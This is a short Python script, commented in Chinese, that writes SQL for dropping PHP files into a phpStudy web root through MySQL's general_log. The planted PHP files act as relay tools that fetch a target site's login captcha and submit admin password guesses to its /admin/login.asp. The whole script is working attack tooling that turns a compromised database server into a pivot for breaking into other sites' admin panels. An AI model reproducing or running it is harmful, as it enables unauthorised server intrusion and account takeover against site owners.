#!/usr/bin/env python3
"""gen_jump_tools.py - 生成通用版81.70跳板工具(动态域名)
getcap2.php: ?d=域名 下载该站GetCode.asp验证码到ys_cap2.jpg
loginpost2.php: ?d=域名&p=密码&c=验证码 提交登录
"""
getcap_body = '<?php $d=$_GET["d"];$ch=curl_init("http://".$d."/GetCode.asp?t=".time());curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_COOKIEJAR,"C:/phpStudy/WWW/jc.txt");curl_setopt($ch,CURLOPT_COOKIEFILE,"C:/phpStudy/WWW/jc.txt");curl_setopt($ch,CURLOPT_TIMEOUT,12);$r=curl_exec($ch);file_put_contents("C:/phpStudy/WWW/ys_cap2.jpg",$r);echo "SAVED:".strlen($r);?>'

loginpost_body = '<?php $d=$_GET["d"];$pw=$_GET["p"];$code=$_GET["c"];$jar="C:/phpStudy/WWW/jc.txt";$ch=curl_init("http://".$d."/admin/login.asp?action=check");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,"username=admin&password=".$pw."&Code=".$code);curl_setopt($ch,CURLOPT_COOKIEJAR,$jar);curl_setopt($ch,CURLOPT_COOKIEFILE,$jar);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_TIMEOUT,12);$r=curl_exec($ch);echo $r;?>'

for name, body in [('getcap2.php', getcap_body), ('loginpost2.php', loginpost_body)]:
    assert "'" not in body, name + " has quote"
    sql = []
    sql.append("SET GLOBAL general_log=OFF;")
    sql.append("SET GLOBAL general_log_file='C:/phpStudy/WWW/%s';" % name)
    sql.append("SET GLOBAL general_log=ON;")
    sql.append("SELECT 'GIF89a%s//'" % body)
    sql.append("SET GLOBAL general_log=OFF;")
    with open('/tmp/jump_%s.sql' % name.replace('.php', ''), 'w') as f:
        f.write('\n'.join(sql) + '\n')
    print(name, 'ready, len:', len(body))
